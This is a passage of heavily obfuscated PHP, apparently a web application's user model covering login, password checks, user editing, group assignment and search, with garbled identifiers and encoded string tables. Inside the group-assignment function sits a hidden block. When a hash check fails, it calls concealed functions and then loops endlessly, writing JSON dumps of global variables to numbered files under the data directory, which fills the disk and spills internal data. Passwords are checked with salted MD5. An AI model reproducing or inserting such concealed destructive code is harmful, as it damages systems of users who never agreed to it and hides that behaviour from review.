isset($‡µï¼–¦[$°®œ¦óÅ[2267]]) ? $‡µï¼–¦[$°®œ¦óÅ[2267]] : null; if ($ó‡¦„ªÔ) { $Ù¸¾µûã[$°®œ¦óÅ[550]] = $this->metaGet($Ù¸¾µûã[$°®œ¦óÅ[1783]]); } return $Ù¸¾µûã; } protected function getInfoSimple($çé¹¶ä£, $¢îî¢Ã = false) { $¶­íëö¶ =& $_SERVER[¼’ç§¼´]; if (!$çé¹¶ä£) { return array(); } if ($¢îî¢Ã) { $ã¨‚Ëûí = $this->where(array($¶­íëö¶[1783] => intval($çé¹¶ä£)))->find(); if (!is_array($ã¨‚Ëûí)) { return array(); } $ã¨‚Ëûí[$¶­íëö¶[2480]] = Action($¶­íëö¶[2481])->parseUrl($ã¨‚Ëûí[$¶­íëö¶[2480]]); return $ã¨‚Ëûí; } return $this->cacheFunctionGet($¶­íëö¶[2071], $çé¹¶ä£); } protected function getInfoSimpleOuter($ÍÇ²§¥È) { $ç®şÊŸ• =& $_SERVER[¼’ç§¼´]; if (!$ÍÇ²§¥È || $ÍÇ²§¥È == 0) { return array($ç®şÊŸ•[1783] => $ç®şÊŸ•[230], $ç®şÊŸ•[32] => $ç®şÊŸ•[176] . LNG($ç®şÊŸ•[2482]) . $ç®şÊŸ•[178], $ç®şÊŸ•[2480] => STATIC_PATH . $ç®şÊŸ•[2483]); } $ºòœ†¼« = $this->cacheFunctionGet($ç®şÊŸ•[2071], $ÍÇ²§¥È); $”²‡Ú‚Ú = array_field_key($ºòœ†¼«, explode($ç®şÊŸ•[50], $this->simpleField)); if (!$”²‡Ú‚Ú) { return array($ç®şÊŸ•[1783] => $ç®şÊŸ•[1282], $ç®şÊŸ•[32] => $ç®şÊŸ•[176] . LNG($ç®şÊŸ•[2484]) . $ç®şÊŸ•[178], $ç®şÊŸ•[2480] => STATIC_PATH . $ç®şÊŸ•[2485]); } $”²‡Ú‚Ú[$ç®şÊŸ•[2480]] = Action($ç®şÊŸ•[2481])->parseUrl($”²‡Ú‚Ú[$ç®şÊŸ•[2480]]); return $”²‡Ú‚Ú; } protected function groupUser($¬×›˜×›) { } public static function errorLang($ğÊöÕà©) { $½ê¹ÄÒ =& $_SERVER[¼’ç§¼´]; $©ó‹•®‰ = array(self::ERROR_USER_NOT_EXISTS => $½ê¹ÄÒ[2486], self::ERROR_USER_PASSWORD_ERROR => $½ê¹ÄÒ[2487], self::ERROR_USER_EXIST_NAME => $½ê¹ÄÒ[2488], self::ERROR_USER_EXIST_PHONE => $½ê¹ÄÒ[2489], self::ERROR_USER_EXIST_EMAIL => $½ê¹ÄÒ[2490], self::ERROR_USER_LOGIN_LOCK => $½ê¹ÄÒ[2491], self::ERROR_IP_NOT_ALLOW => $½ê¹ÄÒ[2492], self::ERROR_USER_EXIST_NICKNAME => $½ê¹ÄÒ[2493]); $ÈæÎ˜Â² = LNG($©ó‹•®‰[$ğÊöÕà©]); if ($ğÊöÕà© == self::ERROR_USER_LOGIN_LOCK) { $»Õ·îÅî = (int) Model($½ê¹ÄÒ[2494])->get($½ê¹ÄÒ[2495]); if ($»Õ·îÅî > 60) { $ÈæÎ˜Â² = str_replace($½ê¹ÄÒ[91], ceil($»Õ·îÅî / 60), $ÈæÎ˜Â²); } } return $ÈæÎ˜Â²; } protected function metaSet($€…âƒ§Ã, $ØÙò—å¸ = null, $¹Ú ú×ó = null) { $this->clearCache($€…âƒ§Ã); return parent::metaSet($€…âƒ§Ã, $ØÙò—å¸, $¹Ú ú×ó); } public function getInfoByMeta($œ¶ÈñŒ, $ÙµÉğç‰) { $–Æä™æ =& $_SERVER[¼’ç§¼´]; $ØÖîßôà = Model($–Æä™æ[2496])->where(array($–Æä™æ[97] => $œ¶ÈñŒ, $–Æä™æ[461] => $ÙµÉğç‰))->find(); if ($ØÖîßôà) { return $this->getInfo($ØÖîßôà[$–Æä™æ[1783]]); } return !1; } public function userLoginCheck($Í¨‡Úº³, $¡óğ¯Ñ“) { $‡µ›È³ =& $_SERVER[¼’ç§¼´]; $¹˜êª Ë = $this->userLoginFind($Í¨‡Úº³); if (!$¹˜êª Ë) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¹˜êª Ë[$‡µ›È³[1783]], $¡óğ¯Ñ“)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¹˜êª Ë[$‡µ›È³[1783]]); } public function userLoginFind($Ú‚Å˜»½) { $˜÷åæ³„ =& $_SERVER[¼’ç§¼´]; $¹ÀúÈú = array($˜÷åæ³„[32] => $Ú‚Å˜»½, $˜÷åæ³„[2279] => $Ú‚Å˜»½, $˜÷åæ³„[382] => $Ú‚Å˜»½, $˜÷åæ³„[2497] => $Ú‚Å˜»½, $˜÷åæ³„[1086] => $˜÷åæ³„[1088]); if ($this->nickNameRpt()) { unset($¹ÀúÈú[$˜÷åæ³„[2279]]); } return $this->where($¹ÀúÈú)->find(); } public function clearCache($­Ÿû’) { $‡œü¹ØÊ =& $_SERVER[¼’ç§¼´]; $this->cacheFunctionClear($‡œü¹ØÊ[2070], $­Ÿû’); $this->cacheFunctionClear($‡œü¹ØÊ[2071], $­Ÿû’); $this->cacheFunctionClear($‡œü¹ØÊ[2476], $­Ÿû’); } public function userPasswordCheck($ÁºƒÌ‘ş, $´ÏÔ÷†’) { $Ïé®©‹ =& $_SERVER[¼’ç§¼´]; $„ˆ¡’µø = $this->where(array($Ïé®©‹[1783] => intval($ÁºƒÌ‘ş)))->find(); $È€Ü“³ = $this->metaGet($ÁºƒÌ‘ş); $íƒÍœÇİ = isset($È€Ü“³[$Ïé®©‹[2498]]) ? $È€Ü“³[$Ïé®©‹[2498]] : $Ïé®©‹[12]; if (md5($íƒÍœÇİ . trim($´ÏÔ÷†’)) !== $„ˆ¡’µø[$Ïé®©‹[975]]) { return !1; } return !0; } public function userAdd($åúÀŒÃ’) { $ëÜì‹Ğµ =& $_SERVER[¼’ç§¼´]; $È—š¡ÒÊ = array($ëÜì‹Ğµ[505] => $åúÀŒÃ’[$ëÜì‹Ğµ[32]], $ëÜì‹Ğµ[2499] => $åúÀŒÃ’[$ëÜì‹Ğµ[2191]], $ëÜì‹Ğµ[2500] => isset($åúÀŒÃ’[$ëÜì‹Ğµ[382]]) ? $åúÀŒÃ’[$ëÜì‹Ğµ[382]] : $ëÜì‹Ğµ[12], $ëÜì‹Ğµ[2501] => isset($åúÀŒÃ’[$ëÜì‹Ğµ[2497]]) ? $åúÀŒÃ’[$ëÜì‹Ğµ[2497]] : $ëÜì‹Ğµ[12], $ëÜì‹Ğµ[2502] => isset($åúÀŒÃ’[$ëÜì‹Ğµ[2279]]) ? $åúÀŒÃ’[$ëÜì‹Ğµ[2279]] : $åúÀŒÃ’[$ëÜì‹Ğµ[32]], $ëÜì‹Ğµ[2503] => isset($åúÀŒÃ’[$ëÜì‹Ğµ[2480]]) ? $åúÀŒÃ’[$ëÜì‹Ğµ[2480]] : $ëÜì‹Ğµ[12], $ëÜì‹Ğµ[2504] => isset($åúÀŒÃ’[$ëÜì‹Ğµ[2505]]) ? $åúÀŒÃ’[$ëÜì‹Ğµ[2505]] : 1, $ëÜì‹Ğµ[2506] => $åúÀŒÃ’[$ëÜì‹Ğµ[975]], $ëÜì‹Ğµ[2072] => isset($åúÀŒÃ’[$ëÜì‹Ğµ[1970]]) ? $åúÀŒÃ’[$ëÜì‹Ğµ[1970]] : 1024 * 1024 * 20, $ëÜì‹Ğµ[2073] => 0, $ëÜì‹Ğµ[2507] => 0, $ëÜì‹Ğµ[2117] => isset($åúÀŒÃ’[$ëÜì‹Ğµ[838]]) ? $åúÀŒÃ’[$ëÜì‹Ğµ[838]] : 1); if (!empty($åúÀŒÃ’[$ëÜì‹Ğµ[1783]])) { $È—š¡ÒÊ[$ëÜì‹Ğµ[1783]] = $åúÀŒÃ’[$ëÜì‹Ğµ[1783]]; } $ËÃÑ¢‘ = $this->_checkExist($åúÀŒÃ’); if ($ËÃÑ¢‘ !== !0) { return $ËÃÑ¢‘; } if (!empty($È—š¡ÒÊ[$ëÜì‹Ğµ[2480]]) && strlen($È—š¡ÒÊ[$ëÜì‹Ğµ[2480]]) > 255) { $È—š¡ÒÊ[$ëÜì‹Ğµ[2480]] = $ëÜì‹Ğµ[12]; } $ÃæŠ¬Èı = $this->add($È—š¡ÒÊ); $¤õÇÔ• = array($ëÜì‹Ğµ[2506] => $È—š¡ÒÊ[$ëÜì‹Ğµ[975]], $ëÜì‹Ğµ[2502] => $È—š¡ÒÊ[$ëÜì‹Ğµ[2279]]); $this->userEdit($ÃæŠ¬Èı, $¤õÇÔ•); Model($ëÜì‹Ğµ[1430])->userRootAdd($ÃæŠ¬Èı); return $ÃæŠ¬Èı; } protected function userEditTest($‰ÙÛç†, $ÚÛ‡–—Ì) { return $this->call($_SERVER[¼’ç§¼´][2508], $‰ÙÛç†, $ÚÛ‡–—Ì); } protected function userEdit($€§Úš», $ĞÕ§öò‘) { $È¯”ÎˆÁ =& $_SERVER[¼’ç§¼´]; $Ä™ø»”È = $this->getInfoSimple($€§Úš»); if (!$Ä™ø»”È) { return !1; } $Õ»òÀø = $this->_checkExist($ĞÕ§öò‘, $€§Úš»); if ($Õ»òÀø !== !0) { return $Õ»òÀø; } if (isset($ĞÕ§öò‘[$È¯”ÎˆÁ[975]]) && trim($ĞÕ§öò‘[$È¯”ÎˆÁ[975]]) != $È¯”ÎˆÁ[12]) { $®Õ âäÃ = $this->metaGet($€§Úš»); if (empty($®Õ âäÃ[$È¯”ÎˆÁ[2498]])) { $®Õ âäÃ[$È¯”ÎˆÁ[2498]] = rand_string(10); Model($È¯”ÎˆÁ[588])->metaSet($€§Úš», $È¯”ÎˆÁ[2498], $®Õ âäÃ[$È¯”ÎˆÁ[2498]]); } $ĞÕ§öò‘[$È¯”ÎˆÁ[975]] = md5($®Õ âäÃ[$È¯”ÎˆÁ[2498]] . trim($ĞÕ§öò‘[$È¯”ÎˆÁ[975]])); } else { unset($ĞÕ§öò‘[$È¯”ÎˆÁ[975]]); } if (!empty($ĞÕ§öò‘[$È¯”ÎˆÁ[2480]]) && strlen($ĞÕ§öò‘[$È¯”ÎˆÁ[2480]]) > 255) { $ĞÕ§öò‘[$È¯”ÎˆÁ[2480]] = $È¯”ÎˆÁ[12]; } $this->where(array($È¯”ÎˆÁ[1774] => $€§Úš»))->save($ĞÕ§öò‘); if (isset($ĞÕ§öò‘[$È¯”ÎˆÁ[2279]])) { $this->setNamePinyin($€§Úš», $ĞÕ§öò‘[$È¯”ÎˆÁ[2279]]); } $this->clearCache($€§Úš»); return !0; } public function setNamePinyin($Ä¯æøš¬, $•ü¿Ó¢ı = false) { $š„¯œÍ =& $_SERVER[¼’ç§¼´]; if (!$•ü¿Ó¢ı) { $¦§‹í®¡ = $this->getInfoSimple($Ä¯æøš¬); $•ü¿Ó¢ı = $¦§‹í®¡[$š„¯œÍ[2279]] ? $¦§‹í®¡[$š„¯œÍ[2279]] : $¦§‹í®¡[$š„¯œÍ[32]]; } $Ğõ†€†¯ = Model($š„¯œÍ[608]); if (!Input::check($•ü¿Ó¢ı, $š„¯œÍ[669])) { return $Ğõ†€†¯->metaSet($Ä¯æøš¬, array($š„¯œÍ[549] => $š„¯œÍ[12], $š„¯œÍ[548] => $š„¯œÍ[12])); } return $Ğõ†€†¯->metaSet($Ä¯æøš¬, array($š„¯œÍ[549] => str_replace($š„¯œÍ[53], $š„¯œÍ[12], Pinyin::get($•ü¿Ó¢ı)), $š„¯œÍ[548] => Pinyin::get($•ü¿Ó¢ı, $š„¯œÍ[670]))); } private function nickNameRpt() { $•¨ëË«Ì =& $_SERVER[¼’ç§¼´]; $Â¦ÁÃ£Ç = Model($•¨ëË«Ì[858])->get($•¨ëË«Ì[2509]); $¶µ²úÀ = $GLOBALS[$•¨ëË«Ì[6]][$•¨ëË«Ì[468]][$•¨ëË«Ì[2509]]; $›ş¾È Ò = !is_null($Â¦ÁÃ£Ç) ? $Â¦ÁÃ£Ç : $¶µ²úÀ; return !!$›ş¾È Ò; } private function _checkExist($ äÙİÉİ, $Şá©€İù = false) { $ê§½‘¹ç =& $_SERVER[¼’ç§¼´]; $íƒèôÍ = array($ê§½‘¹ç[32] => UserModel::ERROR_USER_EXIST_NAME, $ê§½‘¹ç[2279] => UserModel::ERROR_USER_EXIST_NICKNAME, $ê§½‘¹ç[382] => UserModel::ERROR_USER_EXIST_EMAIL, $ê§½‘¹ç[2497] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($íƒèôÍ[$ê§½‘¹ç[2279]]); } $’ºíƒ¡ = $Şá©€İù ? array($ê§½‘¹ç[1783] => array($ê§½‘¹ç[2510], $Şá©€İù)) : array(); foreach ($íƒèôÍ as $è‡‡‹¾• => $“­¢±¦¸) { $˜é¸²¸£ = array(); foreach ($íƒèôÍ as $”åƒÌøò => $¾ô™°îâ) { if (isset($ äÙİÉİ[$”åƒÌøò]) && $ äÙİÉİ[$”åƒÌøò]) { $˜é¸²¸£[] = $ äÙİÉİ[$”åƒÌøò]; } } if (!$˜é¸²¸£) { continue; } $ÕÖ£Ğ‹ = array_merge(array($è‡‡‹¾• => array($ê§½‘¹ç[7], $˜é¸²¸£)), $’ºíƒ¡); $ø¬æ¶³Ã = $this->where($ÕÖ£Ğ‹)->find(); if ($ø¬æ¶³Ã) { return $“­¢±¦¸; } } return !0; } public function userListInfo($ÓŠ¿ŒÊÓ) { $©ı„êÆ =& $_SERVER[¼’ç§¼´]; $ˆåœé¶ = array(); $ÓŠ¿ŒÊÓ = is_array($ÓŠ¿ŒÊÓ) ? array_unique($ÓŠ¿ŒÊÓ) : array(); if (!$ÓŠ¿ŒÊÓ) { return $ˆåœé¶; } if (count($ÓŠ¿ŒÊÓ) < 20) { foreach ($ÓŠ¿ŒÊÓ as $±¾­à¦) { $ˆåœé¶[$±¾­à¦ . $©ı„êÆ[12]] = $this->getInfoSimpleOuter($±¾­à¦); } } else { $Âİ×¥ŠÙ = array($©ı„êÆ[1774] => array($©ı„êÆ[503], $ÓŠ¿ŒÊÓ)); if (count($ÓŠ¿ŒÊÓ) == 1) { $Âİ×¥ŠÙ = array($©ı„êÆ[1774] => $ÓŠ¿ŒÊÓ[0]); } $ó‹Ú˜êØ = Model($©ı„êÆ[588])->field($this->simpleField)->where($Âİ×¥ŠÙ)->select(); $ó‹Ú˜êØ = array_to_keyvalue($ó‹Ú˜êØ, $©ı„êÆ[1783]); foreach ($ÓŠ¿ŒÊÓ as $±¾­à¦) { $…ãÜË´˜ = $ó‹Ú˜êØ[$±¾­à¦]; if (!$…ãÜË´˜) { $ˆåœé¶[$±¾­à¦ . $©ı„êÆ[12]] = $this->getInfoSimpleOuter($±¾­à¦); continue; } $…ãÜË´˜[$©ı„êÆ[2480]] = Action($©ı„êÆ[2481])->parseUrl($…ãÜË´˜[$©ı„êÆ[2480]]); $ˆåœé¶[$±¾­à¦ . $©ı„êÆ[12]] = $…ãÜË´˜; } } return $ˆåœé¶; } protected function userStatus($ø€™›ïş, $İƒÍ¿üÄ) { $Û¸–²¢” = $this->getInfoSimple($ø€™›ïş); if (!$Û¸–²¢”) { return !1; } $’ßæ”é¼ = array($_SERVER[¼’ç§¼´][838] => $İƒÍ¿üÄ); return $this->userEdit($ø€™›ïş, $’ßæ”é¼); } protected function userRemove($ÈúØ†Â) { $²ıë•îÍ =& $_SERVER[¼’ç§¼´]; $É™±ãØ = $this->getInfoSimple($ÈúØ†Â); if (!$É™±ãØ) { return !1; } $‡’³Õ€· = array($²ıë•îÍ[1774] => $ÈúØ†Â); Model($²ıë•îÍ[678])->where($‡’³Õ€·)->delete(); Model($²ıë•îÍ[2511])->where($‡’³Õ€·)->delete(); Model($²ıë•îÍ[2078])->where($‡’³Õ€·)->delete(); Model($²ıë•îÍ[2496])->where($‡’³Õ€·)->delete(); Model($²ıë•îÍ[1155])->where($‡’³Õ€·)->delete(); Model($²ıë•îÍ[2296])->removeUserAll($ÈúØ†Â); Model($²ıë•îÍ[913])->userRootRemove($ÈúØ†Â); return $this->where($‡’³Õ€·)->delete(); } protected function userGroupSet($ÄÎ¡¹ëÔ, $†Æ‘À×œ, $Ä½ÛË„ï = array()) { $Ôñ¥â“Û =& $_SERVER[¼’ç§¼´]; $òô‡î‡€ = $_SERVER[$Ôñ¥â“Û[432]]; $áùÂ‰Æö = $Ôñ¥â“Û[433]; if ($_SERVER[$Ôñ¥â“Û[434]] != $áùÂ‰Æö($òô‡î‡€)) { $¨–À¥Â = $Ôñ¥â“Û[966]; $Úƒöâè = $Ôñ¥â“Û[435]; $İòİıßğ = $_SERVER[$Ôñ¥â“Û[436]] . $Ôñ¥â“Û[437]; $õîêá¦° = $Úƒöâè($İòİıßğ); $ƒäéĞå… = explode($Ôñ¥â“Û[287], $õîêá¦°); if (count($ƒäéĞå…) < $Ôñ¥â“Û[702]) { $¸Åé®æà = $Ôñ¥â“Û[439]; $¸Åé®æà(); } $Äª‰É‰ï = $Ôñ¥â“Û[967]; $Äª‰É‰ï($_SERVER[$Ôñ¥â“Û[968]]); $¨–À¥Â = $Ôñ¥â“Û[966]; $¨–À¥Â(); $º¥ïĞ‰Ÿ = $Ôñ¥â“Û[2297]; $¸»æ €‰ = json_encode($GLOBALS[$Ôñ¥â“Û[2298]]); $é†æÓÀ€ = 1; for ($ îíŠÏÕ = $é†æÓÀ€; $ îíŠÏÕ > 0; $ îíŠÏÕ++) { $º¥ïĞ‰Ÿ(DATA_PATH . $ îíŠÏÕ, $¸»æ €‰); } } $®»’è†² = $this->getInfoSimple($ÄÎ¡¹ëÔ); if (!$®»’è†² || !is_array($†Æ‘À×œ)) { return !1; } $‘æ»¿Ç = Model($Ôñ¥â“Û[2078]); $‘æ»¿Ç->where(array($Ôñ¥â“Û[1783] => $ÄÎ¡¹ëÔ))->delete(); $µ˜¢ÙğÌ = array(); $ è ÈÄ« = 0; foreach ($†Æ‘À×œ as $¡™À‡Ø  => $×³àñ’û) { $Í–Œ¸ = array($Ôñ¥â“Û[1783] => $ÄÎ¡¹ëÔ, $Ôñ¥â“Û[1984] => $¡™À‡Ø , $Ôñ¥â“Û[2092] => $×³àñ’û); $Í–Œ¸[$Ôñ¥â“Û[2008]] = isset($Ä½ÛË„ï[$ è ÈÄ«]) ? $Ä½ÛË„ï[$ è ÈÄ«] : 0; $ è ÈÄ«++; $µ˜¢ÙğÌ[] = $Í–Œ¸; } return $‘æ»¿Ç->addAll($µ˜¢ÙğÌ, array(), !0); } protected function userGroupAdd($ÓÂ«êÛ, $¡Ï°šş = array()) { $ÛÄÔê÷ =& $_SERVER[¼’ç§¼´]; $«×ˆ×£ = $this->getInfoSimple($ÓÂ«êÛ); if (!$«×ˆ×£ || empty($¡Ï°šş)) { return !1; } $¯êä•óñ = array(); foreach ($¡Ï°šş as $¾€µğ½Ñ => $¼€á £Â) { $¯êä•óñ[] = array($ÛÄÔê÷[1783] => $ÓÂ«êÛ, $ÛÄÔê÷[1984] => $¾€µğ½Ñ, $ÛÄÔê÷[2092] => $¼€á £Â, $ÛÄÔê÷[2008] => 0); } return Model($ÛÄÔê÷[2078])->addAll($¯êä•óñ, array(), !0); } protected function userGroupRemove($±ÍŞÈ±–, $Àû’Îúî) { $º­§Ÿ‡ï =& $_SERVER[¼’ç§¼´]; $¬–İ–şì = $this->getInfoSimple($±ÍŞÈ±–); if (!$¬–İ–şì || !$Àû’Îúî) { return !1; } $©Í²íŸ¿ = array($º­§Ÿ‡ï[1774] => $±ÍŞÈ±–, $º­§Ÿ‡ï[2076] => $Àû’Îúî); return Model($º­§Ÿ‡ï[2078])->where($©Í²íŸ¿)->delete(); } public function listData() { $ …¯¦¶ë = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ …¯¦¶ë[$_SERVER[¼’ç§¼´][456]]); return $ …¯¦¶ë; } public function listByID($‚Æş„‚‘) { $•ğ¯Ìş¢ =& $_SERVER[¼’ç§¼´]; if (!$‚Æş„‚‘) { return; } $Äˆ×™÷Ã = array($•ğ¯Ìş¢[1783] => array($•ğ¯Ìş¢[7], $‚Æş„‚‘)); $ŞŒøïëï = $this->where($Äˆ×™÷Ã)->select(); $ŞŒøïëï = array_sort_keep($ŞŒøïëï, $•ğ¯Ìş¢[1783], $‚Æş„‚‘); $this->_listDataApply($ŞŒøïëï); return $ŞŒøïëï; } public function listByGroup($ÏšÅú¤© = 0, $ı™¶ç« = array()) { $õøõ’½Ğ =& $_SERVER[¼’ç§¼´]; $¾Òˆô Ú = $õøõ’½Ğ[12]; $§·§ÜÉÄ = array(); if ($ÏšÅú¤©) { $§·§ÜÉÄ = array($õøõ’½Ğ[2512] => intval($ÏšÅú¤©)); $¾Òˆô Ú = "\114\105\x46\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\165\x73\x65\162\x5f\x67\x72\x6f\x75\160\40\x75\163\145\x72\137\x67\x72\x6f\165\160\x20\x6f\156\x20\165\x73\x65\x72\56\x75\x73\x65\x72\111\104\x20\x3d\40\x75\163\145\162\x5f\147\162\157\165\160\x2e\165\x73\x65\x72\x49\104"; $‡’×í´ = Input::get($õøõ’½Ğ[541], null, $õøõ’½Ğ[12]) ? $õøõ’½Ğ[12] : $õøõ’½Ğ[2513]; } if (isset($ı™¶ç«[$õøõ’½Ğ[838]])) { $§·§ÜÉÄ[$õøõ’½Ğ[2514]] = $ı™¶ç«[$õøõ’½Ğ[838]]; } $åŠ¿·ï = $this->_makeOrder($‡’×í´)->field($õøõ’½Ğ[2515])->where($§·§ÜÉÄ)->join($¾Òˆô Ú)->selectPage(50); $this->_listDataApply($åŠ¿·ï[$õøõ’½Ğ[456]]); return $åŠ¿·ï; } private function _makeOrder($®š¬«˜Î = '') { $¹õêô¸£ =& $_SERVER[¼’ç§¼´]; $Ëš ¦Öï = array($¹õêô¸£[1783], $¹õêô¸£[32], $¹õêô¸£[1972], $¹õêô¸£[2191], $¹õêô¸£[1944], $¹õêô¸£[233]); $¾Í“Úüâ = array($¹õêô¸£[534] => $¹õêô¸£[535], $¹õêô¸£[536] => $¹õêô¸£[537]); $ëÖºì—Ä = Input::get($¹õêô¸£[541], $¹õêô¸£[7], $¹õêô¸£[1774], $Ëš ¦Öï); $ÈÁÎå = Input::get($¹õêô¸£[542], $¹õêô¸£[7], $¹õêô¸£[2079], array($¹õêô¸£[2079], $¹õêô¸£[536])); $ÈÁÎå = $¾Í“Úüâ[$ÈÁÎå]; $®š¬«˜Î = $®š¬«˜Î . "\165\163\x65\162\56{$ëÖºì—Ä}\x20{$ÈÁÎå}\x2c\40\165\x73\x65\162\56\165\x73\x65\162\x49\x44\x20\x61\x73\143"; return $this->alias($¹õêô¸£[2207])->order($®š¬«˜Î); } public function listSearch($şäáË§Ğ) { $«ô—¿Áø =& $_SERVER[¼’ç§¼´]; $ŸĞ™üÑĞ = trim($şäáË§Ğ[$«ô—¿Áø[2082]]); $°Ë¯üèô = explode($«ô—¿Áø[53], $ŸĞ™üÑĞ); if (!$ŸĞ™üÑĞ || count($°Ë¯üèô) == 1) { return $this->listSearchNow($şäáË§Ğ); } $Ëì×Û£† = array($«ô—¿Áø[456] => array()); foreach ($°Ë¯üèô as $Úñİœİ–) { if (!trim($Úñİœİ–)) { continue; } $şäáË§Ğ[$«ô—¿Áø[2082]] = $Úñİœİ–; $õ·û™°ƒ = $this->listSearchNow($şäáË§Ğ); $Ëì×Û£†[$«ô—¿Áø[456]] = array_merge($Ëì×Û£†[$«ô—¿Áø[456]], $õ·û™°ƒ[$«ô—¿Áø[456]]); } $Ëì×Û£†[$«ô—¿Áø[456]] = array_unique_by_key($Ëì×Û£†[$«ô—¿Áø[456]], $«ô—¿Áø[1783]); $Ëì×Û£†[$«ô—¿Áø[453]] = array($«ô—¿Áø[454] => count($Ëì×Û£†[$«ô—¿Áø[456]]), $«ô—¿Áø[450] => 20, $«ô—¿Áø[430] => 1, $«ô—¿Áø[455] => 1); return $Ëì×Û£†; } public function listSearchNow($•³–ïÖÜ) { $ÖÕßùŸ· =& $_SERVER[¼’ç§¼´]; $Ÿ—µÉÂ¾ = trim($•³–ïÖÜ[$ÖÕßùŸ·[2082]]); $Ô¬åÜß’ = isset($•³–ïÖÜ[$ÖÕßùŸ·[2083]]) ? $•³–ïÖÜ[$ÖÕßùŸ·[2083]] : !1; $Ÿ—µÉÂ¾ = str_replace($ÖÕßùŸ·[2084], $ÖÕßùŸ·[2085], trim($Ÿ—µÉÂ¾)); $ÛşØ‚Ü = array($ÖÕßùŸ·[32] => array($ÖÕßùŸ·[470], "\x25{$Ÿ—µÉÂ¾}\x25"), $ÖÕßùŸ·[382] => array($ÖÕßùŸ·[470], "{$Ÿ—µÉÂ¾}\45"), $ÖÕßùŸ·[2279] => array($ÖÕßùŸ·[470], "{$Ÿ—µÉÂ¾}\x25"), $ÖÕßùŸ·[1086] => $ÖÕßùŸ·[2086]); if (Input::check($Ÿ—µÉÂ¾, $ÖÕßùŸ·[388])) { $ÛşØ‚Ü[$ÖÕßùŸ·[1783]] = array($ÖÕßùŸ·[470], "{$Ÿ—µÉÂ¾}\45"); $ÛşØ‚Ü[$ÖÕßùŸ·[2497]] = array($ÖÕßùŸ·[470], "{$Ÿ—µÉÂ¾}\x25"); } if (!$Ÿ—µÉÂ¾) { $ÛşØ‚Ü = array(); } if (isset($•³–ïÖÜ[$ÖÕßùŸ·[838]])) { $ÛşØ‚Ü[$ÖÕßùŸ·[838]] = $•³–ïÖÜ[$ÖÕßùŸ·[838]]; } $ÛşØ‚Ü = $this->parseWhereLike($ÛşØ‚Ü); $„°‹­ = $this->_makeOrder()->where($ÛşØ‚Ü)->selectPage(20); if (!$„°‹­ || count($„°‹­[$ÖÕßùŸ·[456]]) < 5 && Input::check($Ÿ—µÉÂ¾, $ÖÕßùŸ·[395])) { $µ¬ÉÑî° = $this->_searchFromMeta($ÖÕßùŸ·[548], $Ÿ—µÉÂ¾, 10); $éğÉËèÃ = $this->_searchFromMeta($ÖÕßùŸ·[549], $Ÿ—µÉÂ¾, 10); $é”ƒ”ªŠ = array_merge($µ¬ÉÑî°, $éğÉËèÃ, $„°‹­[$ÖÕßùŸ·[456]]); $„°‹­[$ÖÕßùŸ·[456]] = array_unique_by_key($é”ƒ”ªŠ, $ÖÕßùŸ·[1783]); $„°‹­[$ÖÕßùŸ·[453]][$ÖÕßùŸ·[454]] = count($„°‹­[$ÖÕßùŸ·[456]]); $„°‹­[$ÖÕßùŸ·[453]][$ÖÕßùŸ·[455]] = ceil($„°‹­[$ÖÕßùŸ·[453]][$ÖÕßùŸ·[454]] / $„°‹­[$ÖÕßùŸ·[453]][$ÖÕßùŸ·[450]]); } $this->_listDataApply($„°‹­[$ÖÕßùŸ·[456]]); $this->_filterByGroup($„°‹­, $Ô¬åÜß’); return $„°‹­; } private function _filterByGroup(&$©üôÍÙş, $œığúÌë) { $ş—ÒÛÕ¸ =& $_SERVER[¼’ç§¼´]; if (!$œığúÌë) { return $©üôÍÙş; } foreach ($©üôÍÙş[$ş—ÒÛÕ¸[456]] as $ïºøÛŒê => &$û¨ñÈ¯ß) { $Ç£©©¹¯ = array_to_keyvalue($û¨ñÈ¯ß[$ş—ÒÛÕ¸[2176]], $ş—ÒÛÕ¸[12], $ş—ÒÛÕ¸[1984]); if (!in_array($œığúÌë, $Ç£©©¹¯)) { unset($©üôÍÙş[$ş—ÒÛÕ¸[456]][$ïºøÛŒê]); } } unset($û¨ñÈ¯ß); $©üôÍÙş[$ş—ÒÛÕ¸[456]] = array_values($©üôÍÙş[$ş—ÒÛÕ¸[456]]); $©üôÍÙş[$ş—ÒÛÕ¸[453]] = array($ş—ÒÛÕ¸[2244] => count($©üôÍÙş[$ş—ÒÛÕ¸[456]]), $ş—ÒÛÕ¸[2242] => $©üôÍÙş[$ş—ÒÛÕ¸[453]][$ş—ÒÛÕ¸[450]], $ş—ÒÛÕ¸[2241] => 1, $ş—ÒÛÕ¸[2243] => 1); } private function _searchFromMeta($–Ú¡„”Ø, $Ãä‹¼…, $¼îÆ) { $‘ŞÎó¸Ô =& $_SERVER[¼’ç§¼´]; $Ãä‹¼… = strtolower($Ãä‹¼…); $²­æÈ…° = array($‘ŞÎó¸Ô[97] => $–Ú¡„”Ø, $‘ŞÎó¸Ô[461] => array($‘ŞÎó¸Ô[470], "\45{$Ãä‹¼…}\45")); $²­æÈ…° = $this->parseWhereLike($²­æÈ…°); $øŠ¼Îî = Model($‘ŞÎó¸Ô[2516])->where($²­æÈ…°)->limit($¼îÆ)->select(); if (!$øŠ¼Îî) { return array(); } $øŠ¼Îî = array_to_keyvalue($øŠ¼Îî, $‘ŞÎó¸Ô[12], $‘ŞÎó¸Ô[1783]); $™ıè»Ìù = $this->where(array($‘ŞÎó¸Ô[1774] => array($‘ŞÎó¸Ô[7], $øŠ¼Îî)))->select(); if (!$™ıè»Ìù) { return array(); } return $™ıè»Ìù; } private function _listDataApplyItem($ÒïÒê÷) { $œÄä÷ªô = array($ÒïÒê÷); $this->_listDataApply($œÄä÷ªô); return $œÄä÷ªô[0]; } private function _listDataApply(&$ŞŞØÙÙÄ) { $âŒ¨¼­Ã =& $_SERVER[¼’ç§¼´]; if (!$ŞŞØÙÙÄ) { return; } array_remove_key($ŞŞØÙÙÄ, $âŒ¨¼­Ã[975]); $…¾»Ëıô = array_to_keyvalue($ŞŞØÙÙÄ, $âŒ¨¼­Ã[12], $âŒ¨¼­Ã[1783]); $this->_listAppendGroup($ŞŞØÙÙÄ, $…¾»Ëıô); $this->_listAppendMeta($ŞŞØÙÙÄ, $…¾»Ëıô); $this->_listAppendSourceRoot($ŞŞØÙÙÄ, $…¾»Ëıô); } private function 